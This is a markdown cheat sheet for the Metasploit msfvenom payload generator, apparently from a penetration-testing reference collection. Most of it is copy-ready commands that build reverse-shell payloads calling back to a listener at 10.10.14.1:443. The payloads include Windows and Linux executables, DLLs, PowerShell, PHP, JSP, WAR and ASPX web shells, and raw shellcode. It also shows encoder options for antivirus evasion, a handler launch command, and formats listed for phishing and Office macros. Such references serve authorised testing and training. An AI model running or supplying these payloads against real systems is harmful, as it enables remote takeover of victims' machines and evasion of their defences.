---
title: msfvenom
category: tool
subcategory: exploitation
tags:
  - metasploit
  - payload
  - shellcode
  - reverse-shell
  - encoding
last_updated: 2025-12-27
---

# msfvenom

## Table of Contents

- [Overview](#overview)
- [Quick Start](#quick-start)
- [Payload Formats](#payload-formats)
- [Common Encoders](#common-encoders)
- [Documentation](#documentation)

## Overview

msfvenom is the Metasploit Framework payload generator that combines payload creation and encoding. It generates customized payloads for Windows, Linux, macOS, Android, and web applications in various output formats including executables, scripts, and raw shellcode.

**Key Concepts:**
- **Staged payloads** (`/`): Small loader that downloads full payload (e.g., `windows/meterpreter/reverse_tcp`)
- **Stageless payloads** (`_`): Complete payload in single package (e.g., `windows/meterpreter_reverse_tcp`)

## Quick Start

### Basic Syntax

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <output>
```

### Windows Payloads

```bash
# 64-bit Meterpreter reverse shell (exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f exe -o shell.exe

# 32-bit Meterpreter reverse shell (exe)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f exe -o shell.exe

# DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f dll -o shell.dll

# PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f psh -o shell.ps1
```

### Linux Payloads

```bash
# 64-bit ELF reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f elf -o shell.elf

# 32-bit ELF reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.1 LPORT=443 -f elf -o shell.elf
```

### Web Payloads

```bash
# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f raw -o shell.php

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.1 LPORT=443 -f raw -o shell.jsp

# WAR file (Tomcat)
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.1 LPORT=443 -f war -o shell.war

# ASP/ASPX reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f asp -o shell.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f aspx -o shell.aspx
```

### Shellcode Generation

```bash
# C format shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f c

# Python format shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f python

# Raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -f raw -o shellcode.bin
```

### Encoding and Bad Character Avoidance

```bash
# Encode with shikata_ga_nai (5 iterations)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Avoid bad characters (auto-selects encoder)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=443 -b '\x00\x0a\x0d' -f exe -o clean.exe
```

## Payload Formats

| Format | Description | Use Case |
|--------|-------------|----------|
| `exe` | Windows executable | Standard Windows payload |
| `elf` | Linux executable | Standard Linux payload |
| `dll` | Windows DLL | DLL hijacking |
| `psh` | PowerShell script | Fileless execution |
| `asp` / `aspx` | ASP web shell | IIS web servers |
| `jsp` | Java Server Pages | Java web servers |
| `war` | Java Web Archive | Tomcat deployment |
| `raw` | Raw shellcode | Custom loaders |
| `c` / `python` | Language arrays | Exploit development |
| `vba` | VBA macro | Office documents |
| `hta-psh` | HTA application | Phishing attacks |

## Common Encoders

| Encoder | Architecture | Description |
|---------|--------------|-------------|
| `x86/shikata_ga_nai` | x86 | Polymorphic XOR encoder |
| `x64/xor` | x64 | XOR encoder for 64-bit |
| `x86/countdown` | x86 | Single-byte XOR countdown |
| `x86/alpha_mixed` | x86 | Alphanumeric shellcode |
| `cmd/powershell_base64` | - | Base64 PowerShell |

## Documentation

| File | Description |
|------|-------------|
| [official_docs.md](official_docs.md) | Metasploit official msfvenom guide |

## Handler Setup

```bash
# Start listener in msfconsole
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.1; set LPORT 443; exploit"
```

## Quick Reference

```bash
msfvenom -l payloads    # List all payloads
msfvenom -l encoders    # List all encoders
msfvenom -l formats     # List output formats
msfvenom --help-formats # Detailed format help
```
